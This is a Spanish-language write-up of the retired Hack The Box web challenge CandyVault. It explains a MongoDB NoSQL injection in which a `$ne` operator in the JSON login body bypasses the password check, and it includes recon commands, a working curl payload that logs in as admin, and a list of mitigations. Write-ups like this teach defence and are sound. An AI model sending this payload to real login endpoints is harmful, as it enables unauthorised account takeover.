---
challenge: CandyVault
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, nosql, mongodb, authentication-bypass]
---

# CandyVault — Hack The Box (Challenge)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flag real.

## TL;DR

El login de una tienda de dulces envía las credenciales como objetos JSON. El backend las pasa directamente a una consulta MongoDB, por lo que un operador `$ne` evita la comparación de contraseña y permite entrar como administrador.

## Enunciado y superficie

- Web, Easy, retirada.
- Una tienda con registro, login y un panel de administración.
- El objetivo es acceder al panel y leer la flag.

```bash
curl -s -I http://<IP>:<PORT>/
curl -s http://<IP>:<PORT>/login
```

## Reconocimiento

```bash
ffuf -u http://<IP>:<PORT>/FUZZ -w <WORDLIST>
curl -s http://<IP>:<PORT>/api/products
```

- La aplicación es Node.js/Express.
- El login acepta `application/json`.
- Los errores distinguen usuario inexistente de contraseña incorrecta.

## Análisis del fallo

El servidor hace algo equivalente a:

```js
db.users.findOne({ username: req.body.username, password: req.body.password })
```

Si `req.body.password` es un objeto, Mongo interpreta operadores como `$ne`, `$gt` o `$regex` en lugar de comparar una cadena. El tipo no se valida antes de la consulta.

## Explotación

```bash
curl -s http://<IP>:<PORT>/api/login -H 'Content-Type: application/json'   --data '{"username":"admin","password":{"$ne":"x"}}'
```

La respuesta incluye una sesión o un token. Con ella se visita el panel y se localiza la flag, que no se publica.

## Evidencia

- Login válido con una contraseña que no es la real.
- Respuesta con rol de administrador.
- Acceso al panel y lectura de la flag.

## Lecciones aprendidas

- NoSQL no significa ausencia de inyección.
- El tipo de dato es parte de la validación.
- Los mensajes de error facilitan enumerar usuarios.
- Un operador JSON puede cambiar por completo la consulta.

## Mitigaciones y detección

- Convertir los campos a cadena y validar el esquema.
- Usar consultas con tipos estrictos y `$eq`.
- Respuestas de login genéricas y rate limiting.
- Alertar de cuerpos JSON con claves que empiezan por `$`.
- Referencias: OWASP NoSQL Injection, MongoDB operators.

## Referencias

- <https://www.hackthebox.com/challenges/CandyVault>
- <https://owasp.org/www-community/attacks/NoSQL_Injection>
- <https://www.mongodb.com/docs/manual/reference/operator/query/ne/>
- <https://attack.mitre.org/techniques/T1190/>
